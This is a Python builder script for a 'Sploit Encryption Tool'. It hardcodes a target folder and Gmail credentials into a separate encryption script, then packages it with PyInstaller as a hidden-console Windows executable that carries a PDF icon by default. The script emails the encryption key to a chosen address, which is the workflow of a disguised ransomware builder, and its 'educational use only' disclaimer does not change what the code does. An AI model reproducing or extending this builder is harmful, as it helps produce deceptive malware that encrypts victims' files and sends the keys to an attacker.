# builder.py
import time
import os
import subprocess
import sys

GREEN = "\033[92m"
RESET = "\033[0m"

print(GREEN + "⚠️  Warning — Sploit Encryption Tool" + RESET)
print(GREEN + "- Sploit is for educational and ethical testing only, not for illegal use." + RESET)
print(GREEN + "- Encrypt files you own or have permission to test — never harm others." + RESET)
print(GREEN + "- Using Sploit on system files or third-party data may cause permanent loss." + RESET)
print(GREEN + "- By running Sploit, you accept full responsibility for your actions." + RESET)
print(GREEN + "+ Example Path : D:\\New Folder" + RESET)

time.sleep(2)

choice = input("\nDo you want to build an EXE instead of running? (yes/no): ").strip().lower()

if choice == "yes":
    fixed_path = input("\n📂 Enter the path to encrypt: ").strip()
    send_email_choice = input("Do you want to send the key by email? (yes/no): ").strip().lower()
    if send_email_choice == "yes":
        sender_email = input("Enter sender Gmail: ").strip()
        sender_pass = input("Enter sender app password: ").strip()
        receiver_email = input("Enter receiver email: ").strip()
    else:
        sender_email = sender_pass = receiver_email = ""

    icon_choice = input("Do you want a custom icon for EXE? (yes/default = PDF ICO): ").strip().lower()
    if icon_choice == "yes":
        icon_path = input("Enter full path to your custom .ico file: ").strip()
    else:
        icon_path = "icons/ico.ico"

    with open("encryption.py", "r", encoding="utf-8") as f:
        code = f.read()

    if "path = input(" in code:
        code = code.replace(
            'path = input("Enter path to encrypt: ").strip()',
            f'path = r"{fixed_path}"  # Hardcoded by builder'
        )

    if "choice = input(" in code:
        code = code.replace(
            'choice = input("\\nDo you want to send the key to your email? (yes/no): ").strip().lower()',
            f'choice = "{send_email_choice}"  # Hardcoded by builder'
        )
    if 'sender_email = input("Enter sender Gmail: ").strip()' in code:
        code = code.replace(
            'sender_email = input("Enter sender Gmail: ").strip()',
            f'sender_email = "{sender_email}"'
        )
    if 'sender_pass = input("Enter sender app password: ").strip()' in code:
        code = code.replace(
            'sender_pass = input("Enter sender app password: ").strip()',
            f'sender_pass = "{sender_pass}"'
        )
    if 'receiver_email = input("Enter receiver email: ").strip()' in code:
        code = code.replace(
            'receiver_email = input("Enter receiver email: ").strip()',
            f'receiver_email = "{receiver_email}"'
        )

    temp_file = "NamecanbeChanged.py"
    with open(temp_file, "w", encoding="utf-8") as f:
        f.write(code)

    print(GREEN + "\n🛠 Building executable with PyInstaller..." + RESET)

    cmd = [
        sys.executable, "-m", "PyInstaller",
        "--onefile",
        "--noconsole",
        "--clean",
        f"--icon={icon_path}",
        "--hidden-import=cryptography.fernet",
        "--hidden-import=email.mime.text",
        temp_file
    ]

    try:
        subprocess.run(cmd, check=True)
        dist_path = os.path.join("dist", "NamecanbeChanged.exe")
        if os.path.exists(dist_path):
            print(GREEN + f"\n✅ Build complete! EXE created at:\n{dist_path}" + RESET)
            if os.path.exists(temp_file):
                os.remove(temp_file)
            spec_file = "encryption_fixed.spec"
            if os.path.exists(spec_file):
                os.remove(spec_file)
        else:
            print("❌ Build finished but EXE not found. Check PyInstaller logs.")
    except Exception as e:
        print("❌ Build failed:", e)

else:
    print(GREEN + "\n▶ Running encryption.py directly..." + RESET)
    import encryption
